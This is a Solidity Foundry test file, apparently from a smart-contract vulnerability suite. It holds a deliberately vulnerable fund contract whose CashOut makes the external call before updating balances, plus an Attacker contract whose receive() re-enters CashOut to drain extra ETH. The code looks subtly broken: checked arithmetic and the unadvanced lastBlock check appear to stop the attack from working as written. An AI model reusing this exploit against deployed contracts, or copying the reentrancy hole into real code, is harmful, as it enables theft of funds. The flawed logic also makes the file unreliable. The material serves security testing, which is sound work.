
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";

contract TestReentrancyETHFUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _logContract;
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new ETH_FUND(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = ETH_FUND(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        require(msg.value >= val, "Insufficient ETH sent");
        require(val > 1 ether, "Must exceed MinDeposit");
        
        victim.Deposit{value: val}();
        attackCallCount = 0;
        exploitSucceeded = false;
        attackAmount = val;
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.CashOut(val);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 expectedFinalBalance = initialVictimBalance - (val * 2);
        
        if (finalVictimBalance <= expectedFinalBalance && attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}

contract Log {
    struct Message {
        address Sender;
        string Data;
        uint Val;
        uint Time;
    }
    
    Message[] public History;
    Message public LastMsg;
    
    function AddMessage(address _adr, uint _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}

contract ETH_FUND {
    mapping (address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log public TransferLog;
    uint public lastBlock;
    
    constructor(address _log) {
        TransferLog = Log(_log);
    }
    
    function Deposit() public payable {
        if(msg.value > MinDeposit) {
            balances[msg.sender] += msg.value;
            TransferLog.AddMessage(msg.sender, msg.value, "Deposit");
            lastBlock = block.number;
        }
    }
    
    function CashOut(uint _am) public payable {
        if(_am <= balances[msg.sender] && block.number > lastBlock) {
            (bool success, ) = msg.sender.call{value: _am}("");
            if(success) {
                balances[msg.sender] -= _am;
                TransferLog.AddMessage(msg.sender, _am, "CashOut");
            }
        }
    }
    
    receive() external payable {
        Deposit();
    }
}
